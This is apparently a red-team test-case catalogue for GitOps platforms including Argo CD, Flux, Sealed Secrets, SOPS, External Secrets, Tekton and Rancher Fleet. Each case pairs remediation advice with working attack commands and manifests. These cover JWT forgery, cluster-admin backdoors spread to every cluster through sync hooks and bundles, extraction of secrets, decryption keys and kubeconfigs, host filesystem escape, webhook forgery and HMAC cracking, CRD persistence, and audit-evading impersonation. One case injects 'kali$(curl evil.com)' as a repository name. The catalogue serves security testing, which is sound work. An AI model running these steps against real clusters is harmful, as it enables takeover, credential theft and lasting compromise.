# GitOps Security Attack — Test Cases

> Structured test case templates for validating GitOps attack coverage. Each case includes severity, prerequisites, test steps, expected results, remediation, pass criteria, and reference payload.

## Conventions

- **Severity**: CRITICAL / HIGH / MEDIUM / LOW
- **Prerequisites**: Required access, accounts, or pre-conditions
- **Pass Criteria**: Objective conditions indicating the test passes
- **Reference**: Pointer to the specific section in `payloads.md`

---

## A. External Reconnaissance

### TC-GO-001 — GitOps Controller Fingerprint

**Severity**: LOW
**Prerequisites**: Public internet access to target

**Test Steps**:
1. `curl -sk https://argocd.example.com/api/v1/version | jq -r .Version`
2. `curl -sk https://flux.example.com/healthz`
3. Probe well-known webhook paths: `/api/webhook`, `/hook/<token>`
4. Inspect response headers for `X-Argocd-Version`, `Server`

**Expected Results**:
- Argo CD returns JSON with `Version`, `BuildDate`, `GitCommit`
- Flux returns `OK` from `/healthz` on source/notification controllers
- Webhook endpoint returns 200/400 (not 404)

**Remediation**:
- Disable version disclosure at ingress
- Restrict webhook endpoints to source IP allowlist (Git provider IPs)
- mTLS on webhook receiver

**Pass Criteria**: Identified GitOps stack + version

**Reference**: payloads.md §1, §5

---

### TC-GO-002 — Argo CD Default Credentials

**Severity**: CRITICAL
**Prerequisites**: Network access to Argo CD UI/API

**Test Steps**:
1. Identify initial admin password location:
   ```bash
   kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.password}" | base64 -d
   ```
2. Attempt login with common defaults: `admin / argocd`, `admin / admin`, `admin / password`
3. If a bootstrap namespace-name password is found, attempt it

**Expected Results**:
- Hardened: `argocd-initial-admin-secret` Secret absent (deleted after first login)
- Vulnerable: secret present + default password works

**Remediation**:
- Delete `argocd-initial-admin-secret` after initial setup
- Rotate admin password immediately
- Enforce SSO via DEX; disable local admin

**Pass Criteria**: Logged in with default credentials

**Reference**: payloads.md §1.2, §2

---

### TC-GO-003 — Argo CD Anonymous Access

**Severity**: CRITICAL
**Prerequisites**: Network access to Argo CD UI

**Test Steps**:
1. `curl -sk -o /dev/null -w "%{http_code}\n" https://argocd.example.com/applications`
2. 401 = enforced; 200 = anonymous
3. If 200: `curl -sk https://argocd.example.com/api/v1/applications | jq '.items[].metadata.name'`

**Expected Results**:
- Hardened: 401 Unauthorized
- Vulnerable: 200 OK with application list

**Remediation**:
- Set `users.anonymous.enabled: "false"` in `argocd-cm`

**Pass Criteria**: Anonymous enumeration of Applications

**Reference**: payloads.md §1.3

---

## B. Authentication Bypass

### TC-GO-004 — Argo CD JWT Forgery

**Severity**: CRITICAL
**Prerequisites**: Recovered Argo CD signing key (from `argocd-secret`)

**Test Steps**:
1. Recover signing key from `argocd-secret`:
   ```bash
   kubectl get secret argocd-secret -n argocd -o jsonpath='{.data.server\.secretkey}' | base64 -d
   ```
2. Forge JWT with admin group:
   ```python
   import jwt, time
   payload = {"iss":"argocd","iat":int(time.time()),"exp":int(time.time())+86400,"sub":"admin","groups":["argocd-admin"]}
   print(jwt.encode(payload, key, algorithm="HS256"))
   ```
3. Use forged token:
   ```bash
   argocd app list --server argocd.example.com --auth-token "$FORGED"
   ```

**Expected Results**:
- Vulnerable install: forged token accepted, full API access
- Hardened install: token signed with rotating RSA key (TokenReview against DEX)

**Remediation**:
- Use RS256 with rotating key pair
- Bind `argocd-admin` group to DEX group only
- Audit TokenReview webhook

**Pass Criteria**: Authenticated as admin via forged JWT

**Reference**: payloads.md §2.1

---

### TC-GO-005 — DEX SSO Group Claim Injection

**Severity**: HIGH
**Prerequisites**: DEX connector with user-controlled group claims

**Test Steps**:
1. Register a user with profile claiming group `argocd-admin`
2. Trigger OIDC login flow
3. Verify access to Argo CD admin endpoints

**Expected Results**:
- Vulnerable DEX: user-supplied groups trusted → admin access
- Hardened DEX: groups derived from connector only (LDAP, Okta)

**Remediation**:
- Disable insecure DEX connectors (`microsoft` legacy, `github` without org restriction)
- Pin groups from `groups claim` server-side
- Enforce RBAC rule `g, argocd-admin, role:admin`

**Pass Criteria**: Achieved admin via injected group claim

**Reference**: payloads.md §2.2

---

## C. Argo CD Application Abuse

### TC-GO-006 — Cross-Namespace Destination via Application

**Severity**: HIGH
**Prerequisites**: Argo CD Application create permission

**Test Steps**:
1. Create an Application with `destination.namespace: kube-system`:
   ```bash
   cat > app.yaml <<'EOF'
   apiVersion: argoproj.io/v1alpha1
   kind: Application
   metadata: { name: kali-app, namespace: argocd }
   spec:
     source: { repoURL: git@github.com:example/evil.git, path: backdoor }
     destination: { server: https://kubernetes.default.svc, namespace: kube-system }
     syncPolicy: { automated: { prune: true, selfHeal: true } }
   EOF
   kubectl apply -f app.yaml
   ```
2. Wait for sync (~1 min)
3. Check resulting resources: `kubectl get all -n kube-system | grep kali`

**Expected Results**:
- Hardened AppProject: denies `namespace: kube-system`
- Vulnerable AppProject with `destinations: [{namespace: '*'}]`: app syncs

**Remediation**:
- Restrict AppProject destinations to specific namespaces
- Use `sourceNamespaces` to limit which namespaces can create Applications
- Admission webhook enforcing AppProject destination constraints

**Pass Criteria**: Deployed to kube-system via Application

**Reference**: payloads.md §3.1, §3.2

---

### TC-GO-007 — PreSync Hook → cluster-admin

**Severity**: CRITICAL
**Prerequisites**: Source repo write access OR Application create with hook permission

**Test Steps**:
1. Commit a PreSync hook to source repo:
   ```yaml
   apiVersion: batch/v1
   kind: Job
   metadata:
     name: kali-presync
     annotations:
       argocd.argoproj.io/hook: PreSync
   spec:
     template:
       spec:
         serviceAccountName: argocd-application-controller
         restartPolicy: OnFailure
         containers:
           - name: c
             image: bitnami/kubectl:1.29
             command: ["sh","-c","kubectl create clusterrolebinding kali --clusterrole=cluster-admin --serviceaccount=default:kali"]
   ```
2. Trigger Argo CD sync
3. Verify: `kubectl get clusterrolebinding kali`

**Expected Results**:
- Hardened: hook denied (AppProject restricts hook ServiceAccounts)
- Vulnerable: cluster-admin binding created

**Remediation**:
- Restrict hook ServiceAccounts to non-privileged SAs
- OPA Gatekeeper policy: deny ClusterRoleBinding create from sync hooks

**Pass Criteria**: Cluster-admin binding materialized via PreSync

**Reference**: payloads.md §3.2

---

### TC-GO-008 — ApplicationSet Cluster Pivot

**Severity**: CRITICAL
**Prerequisites**: ApplicationSet write access

**Test Steps**:
1. Create ApplicationSet iterating over all clusters:
   ```bash
   cat > as.yaml <<'EOF'
   apiVersion: argoproj.io/v1alpha1
   kind: ApplicationSet
   metadata: { name: kali-fleet, namespace: argocd }
   spec:
     generators: [{ clusters: {} }]
     template:
       metadata: { name: 'kali-{{name}}' }
       spec:
         source: { repoURL: git@github.com:attacker/evil.git, path: backdoor }
         destination: { server: '{{server}}', namespace: kube-system }
         syncPolicy: { automated: { prune: false, selfHeal: true } }
   EOF
   kubectl apply -f as.yaml
   ```
2. Wait for sync (~1 min per cluster)
3. Enumerate: `kubectl get applications -A | grep kali`

**Expected Results**:
- Hardened: AppProject denies ApplicationSet to unknown clusters
- Vulnerable: Applications created for every cluster

**Remediation**:
- Restrict ApplicationSet cluster generator via AppProject
- Use cluster labels to gate generators
- Audit `clusters: {}` patterns

**Pass Criteria**: Backdoor deployed to every cluster

**Reference**: payloads.md §3.5, §25

---

## D. FluxCD Attacks

### TC-GO-009 — Flux GitRepository Secret Extraction

**Severity**: HIGH
**Prerequisites**: K8s read on `flux-system` namespace

**Test Steps**:
1. Enumerate GitRepositories: `kubectl get gitrepository -A`
2. Pull referenced secrets:
   ```bash
   for sec in $(kubectl get gitrepository -A -o jsonpath='{range .items[*]}{.metadata.namespace}{":"}{.spec.secretRef.name}{"\n"}{end}'); do
     ns=${sec%:*}; name=${sec#*:}
     [ -n "$name" ] && kubectl get secret $name -n $ns -o yaml | yq -r '.data'
   done
   ```
3. Decode `identity`, `password`, `username` fields
4. Use recovered key to clone source repo: `git clone git@github.com:example/...`

**Expected Results**:
- Hardened: GitRepository uses IRSA (no in-cluster secret)
- Vulnerable: secret contains long-lived deploy SSH key

**Remediation**:
- Use IRSA / Workload Identity / cloud KMS for Git auth
- Short-lived tokens via `access_token` flow
- Rotate deploy keys; scope read-only

**Pass Criteria**: Recovered Git deploy credentials

**Reference**: payloads.md §6.1

---

### TC-GO-010 — Flux HelmRelease valuesFrom Exfil

**Severity**: HIGH
**Prerequisites**: HelmRelease create with valuesFrom permission

**Test Steps**:
1. Create a Helm chart that echoes values into a ConfigMap:
   ```yaml
   # templates/leak.yaml
   apiVersion: v1
   kind: ConfigMap
   metadata: { name: leak-{{ .Release.Name }} }
   data:
     password: {{ .Values.password | quote }}
   ```
2. Create HelmRelease pointing to your chart and reading victim secret:
   ```yaml
   apiVersion: helm.toolkit.fluxcd.io/v2
   kind: HelmRelease
   metadata: { name: exfil, namespace: flux-system }
   spec:
     chart:
       spec:
         chart: leak
         version: "1.0.0"
         sourceRef: { kind: HelmRepository, name: kali }
     valuesFrom:
       - kind: Secret
         name: production-db
         valuesKey: password
         targetPath: password
   ```
3. Wait for sync, then: `kubectl get configmap leak-exfil -n flux-system -o yaml`

**Expected Results**:
- Hardened: Helm controller blocks valuesFrom from other namespaces
- Vulnerable: secret value appears in ConfigMap

**Remediation**:
- Namespace isolation: HelmRelease valuesFrom restricted to same namespace
- Kyverno policy: deny ConfigMap with sensitive pattern (password, token, key)

**Pass Criteria**: Secret value materialized in ConfigMap

**Reference**: payloads.md §8.1

---

### TC-GO-011 — Flux postRenderer Privileged Patch

**Severity**: CRITICAL
**Prerequisites**: HelmRelease create with postRenderer permission

**Test Steps**:
1. Commit HelmRelease with postRenderer kustomize patch adding `hostPath: /`:
   ```yaml
   apiVersion: helm.toolkit.fluxcd.io/v2
   kind: HelmRelease
   metadata: { name: kali, namespace: flux-system }
   spec:
     chart: { spec: { chart: nginx, sourceRef: { kind: HelmRepository, name: bitnami } } }
     postRenderers:
       - kustomize:
           patches:
             - target: { kind: Deployment }
               patch: |
                 apiVersion: apps/v1
                 kind: Deployment
                 metadata: { name: patched }
                 spec:
                   template:
                     spec:
                       containers:
                         - name: main
                           securityContext: { privileged: true }
                           volumeMounts: [{ name: host, mountPath: /host }]
                       volumes: [{ name: host, hostPath: { path: / } }]
   ```
2. Wait for sync
3. `kubectl exec deploy/nginx -- ls /host/etc`

**Expected Results**:
- Hardened: admission policy blocks privileged SCC
- Vulnerable: host filesystem mounted

**Remediation**:
- Kyverno policy: deny privileged: true
- Pod Security Standards: restricted
- Block postRenderers that add securityContext mutations

**Pass Criteria**: Pod can read host filesystem

**Reference**: payloads.md §8.2

---

## E. Sealed Secrets Compromise

### TC-GO-012 — Sealed Secrets Private Key Recovery

**Severity**: CRITICAL
**Prerequisites**: Read on Sealed Secrets controller namespace

**Test Steps**:
1. Identify active key:
   ```bash
   kubectl get secret -n kube-system -l sealedsecrets.bitnami.com/sealed-secret-key=active
   ```
2. Extract:
   ```bash
   kubectl get secret -n kube-system -l sealedsecrets.bitnami.com/sealed-secret-key=active \
     -o jsonpath='{.items[0].data.tls\.key}' | base64 -d > sealed.key
   ```
3. Decrypt any SealedSecret offline:
   ```bash
   kubeseal --recovery-private-key sealed.key --recovery-cert sealed.crt \
     < production-db.sealed.yaml > production-db.decrypted.yaml
   ```

**Expected Results**:
- Hardened: key rotated monthly, scoped to namespaces
- Vulnerable: single static key for years, all secrets recoverable

**Remediation**:
- Rotate active key quarterly
- Use Sealed Secrets scope namespace isolation
- Restrict `kubectl get secret -l sealed-secret-key` via RBAC

**Pass Criteria**: Decrypted historical SealedSecrets

**Reference**: payloads.md §11

---

### TC-GO-013 — Sealed Secrets Controller Exec

**Severity**: CRITICAL
**Prerequisites**: Exec into Sealed Secrets controller pod

**Test Steps**:
1. Locate controller: `kubectl get deploy -A | grep sealed-secrets`
2. Exec into pod: `kubectl exec -n kube-system deploy/sealed-secrets-controller -- /bin/sh`
3. Hunt for key files: `find / -name 'tls.key' 2>/dev/null`

**Expected Results**:
- Hardened: pod RBAC denies exec; key only in mounted secret
- Vulnerable: key in `/tmp/sealed-secret-key-*`

**Remediation**:
- Pod Security Standards: restricted
- Deny exec into controller pods via OPA policy

**Pass Criteria**: Recovered private key from controller pod

**Reference**: payloads.md §11.1

---

## F. SOPS Compromise

### TC-GO-014 — SOPS AGE Key Recovery

**Severity**: CRITICAL
**Prerequisites**: Read on GitOps namespace

**Test Steps**:
1. Locate AGE key secret:
   ```bash
   kubectl get secret -A | grep -iE '(sops|age)'
   ```
2. Extract:
   ```bash
   kubectl get secret sops-age -n flux-system -o yaml | yq -r '.data."age.agekey"' | base64 -d > age.key
   ```
3. Decrypt any SOPS file:
   ```bash
   SOPS_AGE_KEY_FILE=$PWD/age.key sops --decrypt production.yaml
   ```

**Expected Results**:
- Hardened: AGE key in cloud KMS; SOPS uses cloud decrypt
- Vulnerable: AGE key plaintext in K8s Secret

**Remediation**:
- Migrate SOPS to cloud KMS-backed
- Restrict `kubectl get secret sops-age` to controller SA only

**Pass Criteria**: Decrypted all SOPS files

**Reference**: payloads.md §12

---

### TC-GO-015 — SOPS Cloud KMS Role Hijack

**Severity**: CRITICAL
**Prerequisites**: Pod exec in External Secrets / Flux namespace

**Test Steps**:
1. From inside pod, extract IRSA role:
   ```bash
   AWS_ROLE_ARN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/role)
   AWS_WEB_IDENTITY_TOKEN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
   ```
2. Assume role:
   ```bash
   aws sts assume-role-with-web-identity --role-arn $AWS_ROLE_ARN \
     --role-session-name kali \
     --web-identity-token $AWS_WEB_IDENTITY_TOKEN > creds.json
   ```
3. Use creds to decrypt any SOPS file via KMS:
   ```bash
   export AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId creds.json)
   export AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretAccessKey creds.json)
   export AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken creds.json)
   sops --decrypt production.yaml
   ```

**Expected Results**:
- Hardened: IAM role scoped to specific SOPS KMS keys
- Vulnerable: role has `kms:Decrypt` on all KMS keys

**Remediation**:
- Scope KMS decrypt to specific keys via `kms:ResourceTag`
- Restrict IRSA role to specific namespace

**Pass Criteria**: Decrypted SOPS files via assumed role

**Reference**: payloads.md §12.4

---

## G. External Secrets Operator

### TC-GO-016 — ClusterSecretStore Enumeration

**Severity**: HIGH
**Prerequisites**: ClusterSecretStore read

**Test Steps**:
1. `kubectl get clustersecretstore -A -o yaml | yq -r '.items[].spec'`
2. Map upstream: Vault address, AWS region, GCP project
3. Identify weakest CSS (e.g., broad credentials)

**Expected Results**:
- Catalogued: every upstream secret store, every permission boundary

**Remediation**:
- Restrict ClusterSecretStore to namespace-scoped SecretStore where possible
- Audit upstream permissions

**Pass Criteria**: Identified ≥3 upstream secret stores

**Reference**: payloads.md §13.1

---

### TC-GO-017 — ExternalSecret Push Exfil

**Severity**: HIGH
**Prerequisites**: ExternalSecret create

**Test Steps**:
1. Create ExternalSecret pulling from every key:
   ```bash
   cat > es.yaml <<'EOF'
   apiVersion: external-secrets.io/v1
   kind: ExternalSecret
   metadata: { name: kali-exfil, namespace: default }
   spec:
     secretStoreRef: { name: vault-prod, kind: ClusterSecretStore }
     target: { name: kali-exfil-secret }
     data:
       - { secretKey: x, remoteRef: { key: secret/data/production/db } }
       - { secretKey: y, remoteRef: { key: secret/data/production/api } }
   EOF
   kubectl apply -f es.yaml
   ```
2. Wait for sync (~30s)
3. `kubectl get secret kali-exfil-secret -o yaml`

**Expected Results**:
- Hardened: ExternalSecrets denied from non-trusted namespaces
- Vulnerable: secrets materialized in arbitrary namespace

**Remediation**:
- Restrict ExternalSecret creation to specific namespaces
- Audit ClusterSecretStore target namespace policies

**Pass Criteria**: Pulled all secrets via ExternalSecret

**Reference**: payloads.md §13.4

---

## H. Tekton Pipeline Abuse

### TC-GO-018 — Tekton Privileged Task

**Severity**: CRITICAL
**Prerequisites**: Task create permission in Tekton namespace

**Test Steps**:
1. Commit a Task with `securityContext.privileged: true`
2. Create a TaskRun
3. Verify container escape: `kubectl exec taskrun-pod -- cat /proc/1/root/etc/shadow`

**Expected Results**:
- Hardened: Tekton SCC restricted; privileged rejected
- Vulnerable: host escape

**Remediation**:
- Apply Pod Security Admission restricted policy
- Use Tekton feature flag `disable-creds-init` to limit credential access
- Kyverno policy: reject privileged: true in tekton-pipelines namespace

**Pass Criteria**: Escaped to host via Tekton pod

**Reference**: payloads.md §15.1

---

### TC-GO-019 — Tekton TriggerTemplate Injection

**Severity**: HIGH
**Prerequisites**: TriggerTemplate create permission

**Test Steps**:
1. Create TriggerTemplate with unescaped interpolation:
   ```yaml
   apiVersion: triggers.tekton.dev/v1beta1
   kind: TriggerTemplate
   metadata: { name: kali-tt }
   spec:
     params: [{ name: git-repo }]
     resourcetemplates:
       - apiVersion: tekton.dev/v1
         kind: PipelineRun
         metadata: { generateName: "$(tt.params.git-repo)-" }
   ```
2. Trigger with malicious repo name: `kali$(curl evil.com)`
3. Observe command execution

**Expected Results**:
- Hardened: TriggerTemplate validates params via CEL
- Vulnerable: command injection

**Remediation**:
- Use Tekton `Interceptor` for input validation
- Reject params with shell metacharacters

**Pass Criteria**: Achieved code execution via param injection

**Reference**: payloads.md §15.2

---

## I. Rancher Fleet Abuse

### TC-GO-020 — Fleet Bundle → Multi-Cluster Backdoor

**Severity**: CRITICAL
**Prerequisites**: Bundle create in `fleet-default`

**Test Steps**:
1. Create Bundle targeting `all-clusters` group:
   ```bash
   cat > bundle.yaml <<'EOF'
   apiVersion: fleet.cattle.io/v1alpha1
   kind: Bundle
   metadata: { name: kali-backdoor, namespace: fleet-default }
   spec:
     targets: [{ clusterGroup: all-clusters }]
     resources:
       - apiVersion: v1
         kind: ServiceAccount
         metadata: { name: kali, namespace: kube-system }
       - apiVersion: rbac.authorization.k8s.io/v1
         kind: ClusterRoleBinding
         metadata: { name: kali-binding }
         roleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin }
         subjects: [{ kind: ServiceAccount, name: kali, namespace: kube-system }]
   EOF
   kubectl apply -f bundle.yaml
   ```
2. Wait for Fleet agent on each cluster to apply
3. Pivot: `kubectl --kubeconfig=<cluster> get pods -n kube-system`

**Expected Results**:
- Hardened: Fleet RBAC restricts Bundle target to specific clusterGroups
- Vulnerable: backdoor on every cluster

**Remediation**:
- Restrict Bundle targets via Fleet RBAC
- Audit `all-clusters` group membership

**Pass Criteria**: Cluster-admin across all clusters

**Reference**: payloads.md §16

---

## J. Webhook Forgery

### TC-GO-021 — Forge GitHub Push Event

**Severity**: HIGH
**Prerequisites**: Network access to webhook endpoint

**Test Steps**:
1. Identify webhook endpoint: `curl https://argocd.example.com/api/webhook`
2. Forge Push event:
   ```bash
   curl -X POST https://argocd.example.com/api/webhook \
     -H "X-GitHub-Event: push" \
     -d '{"repository":{"clone_url":"https://github.com/attacker/evil.git"},"ref":"refs/heads/main","after":"abc"}'
   ```
3. Watch for sync: `kubectl get applications -A -w`

**Expected Results**:
- Hardened: webhook verifies HMAC signature
- Vulnerable: forged event triggers sync

**Remediation**:
- Configure Argo CD / Flux webhook secret
- IP-allowlist Git provider ranges
- Reject unsigned webhook events

**Pass Criteria**: Forged event triggered sync

**Reference**: payloads.md §18

---

### TC-GO-022 — Webhook HMAC Brute Force

**Severity**: MEDIUM
**Prerequisites**: Captured webhook payloads + signatures

**Test Steps**:
1. Obtain known payload + HMAC signature pair
2. Brute force secret:
   ```bash
   hashcat -m 1450 'SHA256:KNOWN_HMAC:KNOWN_PAYLOAD' rockyou.txt
   ```
3. Reconstruct signing key, forge future events

**Expected Results**:
- Hardened: ≥32-byte random secret
- Vulnerable: weak secret brute-forced

**Remediation**:
- Generate 32-byte random webhook secret
- Rotate annually

**Pass Criteria**: Brute-forced webhook secret

**Reference**: payloads.md §18.4

---

## K. Persistence

### TC-GO-023 — CRD Backdoor Persistence

**Severity**: CRITICAL
**Prerequisites**: Cluster-admin

**Test Steps**:
1. Deploy CRD + controller (see payloads §22)
2. Create a `Kali` resource that triggers cluster-admin binding
3. Defender deletes the binding; controller re-creates it
4. Defender deletes controller; CRD + sync re-creates controller

**Expected Results**:
- Hardened: admission webhook rejects unknown CRDs
- Vulnerable: backdoor survives cleanup

**Remediation**:
- Allowlist CRDs via admission policy
- Audit CRD creation events
- Image allowlist for controller images

**Pass Criteria**: Backdoor survives manual cleanup

**Reference**: payloads.md §22

---

### TC-GO-024 — Self-Heal Cover

**Severity**: HIGH
**Prerequisites**: Application with selfHeal: true

**Test Steps**:
1. Confirm Application spec has `selfHeal: true`
2. Manually delete a backdoor resource:
   ```bash
   kubectl delete pod kali-backdoor -n production
   ```
3. Wait 60s, observe recreation

**Expected Results**:
- Pod recreated by Argo CD self-heal

**Remediation**:
- Pause Application during IR: `argocd app stop prod-app`
- Use `syncPolicy.automated.selfHeal: false` for production

**Pass Criteria**: Resource recreated within 60s of deletion

**Reference**: payloads.md §23.1

---

## L. Audit Log Suppression

### TC-GO-025 — Impersonation Bypass

**Severity**: MEDIUM
**Prerequisites**: GitOps SA with impersonate permission

**Test Steps**:
1. `kubectl auth can-i --as=system:admin --list`
2. If allowed: `kubectl --as=system:anonymous get secrets -A`

**Expected Results**:
- Hardened: impersonation permission not granted to GitOps SA
- Vulnerable: anonymous actions hidden from audit

**Remediation**:
- Audit `impersonate` verb in ClusterRole bindings
- Forbid `--as=system:*` impersonation

**Pass Criteria**: Actions performed as system:anonymous

**Reference**: payloads.md §24.2

---

## M. Multi-Cluster Pivot

### TC-GO-026 — Argo Cluster Secret Pivot

**Severity**: CRITICAL
**Prerequisites**: Read on argocd namespace secrets

**Test Steps**:
1. List cluster secrets:
   ```bash
   kubectl get secret -n argocd -l argocd.argoproj.io/secret-type=cluster
   ```
2. Extract kubeconfig:
   ```bash
   for c in $(kubectl get secret -n argocd -l argocd.argoproj.io/secret-type=cluster -o name); do
     kubectl get $c -n argocd -o jsonpath='{.data.config}' | base64 -d > ${c##*/}.kubeconfig
   done
   ```
3. Pivot:
   ```bash
   KUBECONFIG=prod-us-east-1.kubeconfig kubectl get pods -A
   ```

**Expected Results**:
- Hardened: cluster secrets use short-lived tokens + narrow RBAC
- Vulnerable: cluster-admin kubeconfig for every cluster

**Remediation**:
- Use Argo CD ApplicationSet with per-cluster RBAC
- Short-lived tokens via cluster TokenRequest API
- Restrict `kubectl get secret -l argocd.argoproj.io/secret-type=cluster`

**Pass Criteria**: Pivot to ≥2 clusters via Argo secrets

**Reference**: payloads.md §25

---

## Aggregate Pass Criteria

A successful engagement covers at minimum:
- **≥6 test cases passed across ≥3 GitOps platforms** (Argo CD, Flux, Fleet, Tekton, Jenkins X)
- **≥1 CRITICAL case per platform demonstrating full breach chain**
- **≥1 secret-store compromise** (Sealed Secrets, SOPS, External Secrets, Vault)
- **≥1 multi-cluster finding** (ApplicationSet, Fleet Bundle, Argo cluster secrets)
- **≥1 persistence finding** (CRD backdoor, PreSync hook, self-heal cover)
- **≥1 detection rule** for at least one demonstrated attack
- **≥1 audit-log suppression or impersonation finding**

---

## Reporting Template (per test case)

```markdown
### TC-GO-XXX — <Case Title>

**Status**: PASS / FAIL / PARTIAL
**Target**: <Argo CD / Flux / etc.>
**Window**: <start> - <end> UTC
**Operator**: <name>

**Findings**:
- <bullet points>

**Evidence**:
- HTTP request/response: <path>
- Manifests: <path>
- Controller logs: <path>
- Audit log entries: <REDACTED path>

**Impact**:
- <cluster-wide compromise / secret exfil / multi-cluster pivot>
- <downstream user/cluster count affected>

**Remediation**:
1. <short-term>
2. <medium-term>
3. <long-term>

**Detection Rule**:
<kql/spl/sigma/falco query>

**References**:
- Argo CD advisory: <URL>
- MITRE ATT&CK: <technique>
```

---

## References

- Argo CD Security Advisories — https://github.com/argoproj/argo-cd/security/advisories
- FluxCD Security Advisories — https://github.com/fluxcd/flux2/security/advisories
- Bitnami Sealed Secrets — https://github.com/bitnami-labs/sealed-secrets
- Mozilla SOPS — https://github.com/getsops/sops
- External Secrets Operator — https://external-secrets.io/
- HashiCorp Vault — https://developer.hashicorp.com/vault
- Tekton Pipelines — https://tekton.dev/
- Rancher Fleet — https://fleet.rancher.io/
- NSA Kubernetes Hardening Guide v1.2 (2024)
- MITRE ATT&CK for Containers — T1610 Deploy Container, T1611 Escape to Host, T1525 Implant Internal Image
- Aqua Security — *GitOps Attack Surface* (2024)
- Palo Alto Unit 42 — *Argo CD Misconfigurations in the Wild* (2024)
